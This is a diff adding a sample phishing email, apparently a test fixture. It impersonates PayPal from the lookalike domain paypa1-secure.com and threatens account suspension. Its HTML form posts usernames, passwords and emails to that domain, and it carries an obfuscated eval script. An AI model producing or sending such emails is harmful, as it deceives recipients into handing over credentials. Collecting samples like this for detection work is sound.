@@ -1,0 +1,70 @@
+From: "PayPal Security Team" <security@paypa1-secure.com>
+To: victim@example.com
+Subject: Urgent: Verify Your Account Within 24 Hours
+Date: Thu, 12 Dec 2024 14:25:30 +0000
+Message-ID: <abc123@paypa1-secure.com>
+Return-Path: <bounce@sender-server.net>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="----=_Part_123456"
+
+------=_Part_123456
+Content-Type: text/plain; charset="UTF-8"
+
+Dear PayPal Customer,
+
+We have detected unusual activity on your account. Your account will be suspended 
+within 24 hours unless you verify your information immediately.
+
+Please click here to verify: http://paypa1-secure.com/verify?id=12345
+
+This is urgent and requires immediate action. Failure to verify will result in 
+permanent account suspension.
+
+Thank you for your prompt attention.
+
+PayPal Security Team
+
+------=_Part_123456
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+<head>
+<style>
+body { font-family: Arial, sans-serif; }
+.urgent { color: red; font-weight: bold; }
+</style>
+</head>
+<body>
+
+<h2>PayPal Account Verification Required</h2>
+
+<p class="urgent">URGENT: Your account will be suspended in 24 hours!</p>
+
+<p>Dear PayPal Customer,</p>
+
+<p>We have detected <b>unusual activity</b> on your account. To prevent suspension, 
+please verify your information immediately.</p>
+
+<form action="http://paypa1-secure.com/verify" method="post">
+    <p>Username: <input type="text" name="username"></p>
+    <p>Password: <input type="password" name="password"></p>
+    <p>Email: <input type="email" name="email"></p>
+    <input type="submit" value="Verify Account Now">
+</form>
+
+<p><a href="http://paypa1-secure.com/verify?id=12345">Click here if form doesn't work</a></p>
+
+<p style="color: red;">This is urgent and requires immediate action within 24 hours!</p>
+
+<p>Thank you,<br>
+PayPal Security Team</p>
+
+<script>
+// Obfuscated tracking
+eval(unescape("%66%75%6e%63%74%69%6f%6e"));
+</script>
+
+</body>
+</html>
+
+------=_Part_123456--
